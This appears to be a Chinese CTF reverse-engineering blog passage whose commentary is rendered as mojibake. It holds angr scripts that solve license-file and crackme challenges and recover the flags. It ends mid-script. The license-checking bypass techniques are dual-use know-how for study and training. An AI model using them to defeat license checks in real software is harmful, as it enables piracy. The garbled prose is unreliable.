<p>è¿˜å¾—ç”¨å®ƒæä¾›çš„ç¬¦å·æ–‡ä»¶æ¬¸ï¼Œä¸ç„¶è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªï¼Œå¤šå°‘æœ‰ç‚¹é—®é¢˜ã€‚è¿™é“é¢˜å¾ˆæœ‰æ”¶è·ï¼Œä½†æ˜¯æœ‰ç‚¹ç–‘é—®ï¼Œå°±æ˜¯ä¸ºä»€ä¹ˆä¸é€‚ç”¨æ–‡ä»¶ç³»ç»Ÿç¬¦å·æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œç¨‹åºè¿›è¡Œä¸ä¸‹å»ï¼ˆå†…å­˜å æ»¡ã€‚ã€‚ï¼‰è¢« KILL äº†ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"license"</span><span class="token punctuation">,</span> load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

    <span class="token comment"># Create a blank state</span>
    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Build the file whose name is weird</span>
    license_name <span class="token operator">=</span> <span class="token string">"_a\nb\tc_"</span>

    <span class="token comment"># This is the license file</span>
    <span class="token comment"># From analyzing the binary, we know that the license file should have five </span>
    <span class="token comment"># lines in total, and each line has 6 characters. Not setting file content </span>
    <span class="token comment"># may also work, but in that case, angr will produce many more paths, and we </span>
    <span class="token comment"># will spent much more time in path trimming.</span>

    bytestring <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        line <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">]</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line<span class="token punctuation">.</span>append<span class="token punctuation">(</span>state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'license_file_byte_%d_%d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            state<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> bytestring <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>line<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> bytestring<span class="token punctuation">.</span>concat<span class="token punctuation">(</span>state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>line<span class="token punctuation">)</span>

    license_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>license_name<span class="token punctuation">,</span> bytestring<span class="token punctuation">)</span>
    state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>license_name<span class="token punctuation">,</span> license_file<span class="token punctuation">)</span>

    simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>

    simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>
                find<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x400e93</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>
                avoid<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x400bb1</span><span class="token punctuation">,</span> <span class="token number">0x400b8f</span><span class="token punctuation">,</span> <span class="token number">0x400b6d</span><span class="token punctuation">,</span> <span class="token number">0x400a85</span><span class="token punctuation">,</span>
                       <span class="token number">0x400ebf</span><span class="token punctuation">,</span> <span class="token number">0x400a59</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span>

    <span class="token comment"># One path will be found</span>
    found <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    rsp <span class="token operator">=</span> found<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsp
    flag_addr <span class="token operator">=</span> rsp <span class="token operator">+</span> <span class="token number">0x278</span> <span class="token operator">-</span> <span class="token number">0xd8</span> <span class="token comment"># Ripped from IDA</span>
    <span class="token comment"># Perform an inline call to strlen() in order to determine the length of the </span>
    <span class="token comment"># flag</span>
    FAKE_ADDR <span class="token operator">=</span> <span class="token number">0x100000</span>
    strlen <span class="token operator">=</span> <span class="token keyword">lambda</span> state<span class="token punctuation">,</span> arguments<span class="token punctuation">:</span> \
        angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> FAKE_ADDR<span class="token punctuation">,</span> p<span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span>
            state<span class="token punctuation">,</span> arguments<span class="token operator">=</span>arguments
        <span class="token punctuation">)</span>
    flag_length <span class="token operator">=</span> strlen<span class="token punctuation">(</span>found<span class="token punctuation">,</span> arguments<span class="token operator">=</span><span class="token punctuation">[</span>flag_addr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ret_expr
    <span class="token comment"># In case it's not null-terminated, we get the least number as the length</span>
    flag_length_int <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>flag_length<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Read out the flag!</span>
    flag_int <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span> flag_length_int<span class="token punctuation">)</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_int<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> flag

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'ASIS&#123;8d2cc30143831881f94cb05dcf0b83e0&#125;'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython

LEN  <span class="token operator">=</span> <span class="token number">0</span>
addr <span class="token operator">=</span> <span class="token number">0x100000</span>
license_name <span class="token operator">=</span> <span class="token string">"_a\nb\tc_"</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> LEN

    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./license"</span><span class="token punctuation">)</span>
    length <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"length"</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span>
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45235</span> <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length
                <span class="token operator">-</span> <span class="token number">1256</span> <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length
                <span class="token operator">+</span> <span class="token number">14392</span> <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">-</span> <span class="token number">59762</span>
                <span class="token operator">*</span> length <span class="token operator">-</span> <span class="token number">0x1C5F164EF8C</span> <span class="token operator">+</span> <span class="token number">44242</span>
                <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">*</span> length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    LEN <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">hook_str_addr</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> addr
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ADDR = "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

    bytestring <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        line <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">]</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line<span class="token punctuation">.</span>append<span class="token punctuation">(</span>st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'license_file_byte_%d_%d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> bytestring <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>line<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            bytestring <span class="token operator">=</span> bytestring<span class="token punctuation">.</span>concat<span class="token punctuation">(</span>st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>line<span class="token punctuation">)</span>

    <span class="token comment"># license_chars = [claripy.BVS("license_%d" % i,8) for i in range(LEN)]</span>
    <span class="token comment"># license_stream = claripy.Concat(*license_chars)</span>
    <span class="token comment"># license_file = angr.storage.file.SimFile(license_name, license_stream)</span>
    <span class="token comment"># st.fs.insert(license_name, license_file)</span>

    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x400A30</span><span class="token punctuation">,</span>hook_str_addr<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x400BD0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x400BB1</span><span class="token punctuation">,</span><span class="token number">0x400B9F</span><span class="token punctuation">,</span><span class="token number">0x400EBF</span><span class="token punctuation">,</span><span class="token number">0x400B77</span><span class="token punctuation">,</span><span class="token number">0x400A85</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x400E9D</span><span class="token punctuation">]</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x400BB1</span><span class="token punctuation">,</span><span class="token number">0x400B9F</span><span class="token punctuation">,</span><span class="token number">0x400EBF</span><span class="token punctuation">,</span><span class="token number">0x400B77</span><span class="token punctuation">,</span><span class="token number">0x400A85</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    
    found       <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    flag_addr   <span class="token operator">=</span> found<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsp <span class="token operator">+</span> <span class="token number">0x1A0</span>

    flag_int    <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>found<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    flag        <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_int<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    license_int <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>found<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    license     <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>license_int<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token punctuation">:</span>flag<span class="token punctuation">,</span><span class="token string">"license"</span><span class="token punctuation">:</span>license<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token punctuation">:</span><span class="token string">b"ASIS&#123;8d2cc30143831881f94cb05dcf0b83e0&#125;"</span><span class="token punctuation">,</span>
                    <span class="token string">"license"</span><span class="token punctuation">:</span><span class="token string">b"tl9GUA\n\x1d'n(\x0f\r\n/\x15:\x15\x1d3\nhgyGxW\n49\x064(."</span><span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="ais3-crackme-DONE"><a href="#ais3-crackme-DONE" class="headerlink" title="ais3_crackme |DONE"></a>ais3_crackme |DONE</h3><p>ä»å‘½ä»¤è¡Œä¸­è¾“å…¥ flag ï¼Œæ±‚è§£ ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./ais3_crackme"</span><span class="token punctuation">)</span>

    <span class="token comment"># p.hook(0x40060E,print("failed"),length=0)</span>

    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%d"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_tail"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"./ais3_crackme"</span><span class="token punctuation">,</span>flag<span class="token punctuation">]</span>
    <span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x400607</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    found <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    <span class="token comment"># print(sm.stashes)</span>
    <span class="token comment"># IPython.embed()</span>

    <span class="token keyword">return</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="RaRCTF2021-Jammyâ€™s-Old-Infra-DONE"><a href="#RaRCTF2021-Jammyâ€™s-Old-Infra-DONE" class="headerlink" title="RaRCTF2021 Jammyâ€™s Old Infra |DONE"></a>RaRCTF2021 Jammyâ€™s Old Infra |DONE</h3><p>ä¸ä¼šè°ƒè¯•ï¼Œç­‰ä¸€ä¸ªæœ‰ç¼˜äººæ•™æˆ‘æ€ä¹ˆåŠ¨è°ƒ soï¼Œæˆ‘çœ‹é¢˜ç›®æ¶æ„éƒ½ç»™é½å…¨äº†å‘€ï¼Œä¸ºä»€ä¹ˆ ida ä¼šæ‰¾ä¸åˆ°è¿™ä¸ª so å‘¢ã€‚ä¸€å¼€å§‹æœ‰ä¸€ä¸ª Decrypt_Key å‡½æ•°ï¼Œè¯•ç€ç”¨ angr æ‰§è¡Œäº†ä¸€ä¸‹ï¼Œè¿˜è¡Œï¼Œä¸€å¼€å§‹ç”¨çš„æ—¶å€™ç»å¸¸ç»™ angr çš„å¤§ç«¯åºå°ç«¯åºå‘ï¼ŒX86 éƒ½è¯†åˆ«å‡ºæ¥äº†ï¼Œå±…ç„¶è¿˜é»˜è®¤ç”¨å¤§ç«¯åºï¼Œé»˜è®¤æŠŠç¨‹åºé‡Œé¢çš„ä¸œè¥¿éƒ½å½“å­—ç¬¦ä¸²äº†å‘—ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ~/.virtualenvs/angr/bin/python</span>
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> angr

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    base <span class="token operator">=</span> <span class="token number">0x0</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./libnative-lib.so"</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>
            <span class="token string">'base_addr'</span> <span class="token punctuation">:</span> base
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

    aes_cbc_decrypt_off <span class="token operator">=</span> <span class="token number">0x85D0</span>
    aes_cbc_decrypt_end <span class="token operator">=</span> <span class="token number">0x8C10</span>
    decryptKey_off      <span class="token operator">=</span> <span class="token number">0x8500</span>
    decryptKey_end      <span class="token operator">=</span> <span class="token number">0x85B4</span>
    error_off           <span class="token operator">=</span> <span class="token number">0x9C99</span>
    a1_pt             <span class="token operator">=</span> <span class="token number">0x3000000</span>
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> decryptKey_off<span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> <span class="token number">0x8000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> <span class="token number">0x9000000</span>  <span class="token comment"># å¯èƒ½é˜²æ­¢å†…å­˜ä¸å¯¹å…¶å¯¼è‡´ æŠ¥é”™</span>

    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edi <span class="token operator">=</span> <span class="token number">0x4000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> <span class="token number">0x5000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ecx <span class="token operator">=</span> <span class="token number">0x0</span>
    st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x9000004</span><span class="token punctuation">,</span><span class="token number">0x3</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token punctuation">[</span>decryptKey_end<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x3000000</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token comment"># BE</span>
    <span class="token comment"># 0x800000c0c00000c0c00000c0</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç„¶åå°±ä¸€å‘ä¸å¯æ”¶æ‹¾äº†</p>
<p>æœ‰ä¸¤ä¸ª chek å‡½æ•°ï¼Œä¸€ä¸ª check nameï¼Œä¸€ä¸ª check passwordã€‚</p>
<p>ç”¨çš„ angr é»‘ç›’å‡ºæ¥çš„,ç›´æ¥æ‰§è¡Œï¼Œæ„Ÿè§‰ angr çš„ call ä¸å¥½ç”¨ï¼Œè‡ªå·±å†™äº†ä¸€å¥—æ¨¡æ¿ï¼Œä¸‹æ¬¡å†æ”¹è¿›</p>
<p>1ã€ä¸€äº›ç®€å•çš„å‡½æ•° hook å¯ä»¥ä½¿ç”¨ lambda è¡¨è¾¾å¼<br>2ã€æ•´ä½“çš„æ¨¡æ¿è¿˜å·®ä¸€äº›å‚æ•°çš„è°ƒæ•´<br>3ã€æœ‰å…³æ•ˆç‡çš„ä¼˜åŒ–ï¼Œå¼•æ“çš„ä¼˜åŒ–<br>4ã€inline_call() emmï¼Œæˆ‘ç›®å‰è¿˜æ²¡é‡åˆ°ä¸€ä¸ªå‡½æ•°å¤ªå¤§è§£å†³ä¸äº†éœ€è¦è°ƒç”¨åˆ«çš„å†…æ•›çš„ SimProcedure çš„æƒ…å†µï¼Œå› ä¸ºç›®å‰ï¼Œå°±æ˜¯ç»™æ¯ä¸€ä¸ªè°ƒç”¨æœ‰ç‚¹é—®é¢˜çš„å‡½æ•°æ¥ç‚¹ä¿®é¥°ã€‚</p>
<h4 id="solve-password-py"><a href="#solve-password-py" class="headerlink" title="solve_password.py"></a>solve_password.py</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> angr <span class="token keyword">import</span> Project<span class="token punctuation">,</span>SimProcedure<span class="token punctuation">,</span>SIM_PROCEDURES
<span class="token keyword">import</span> archinfo
<span class="token keyword">import</span> monkeyhex
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> logging

base <span class="token operator">=</span> <span class="token number">0x0</span>

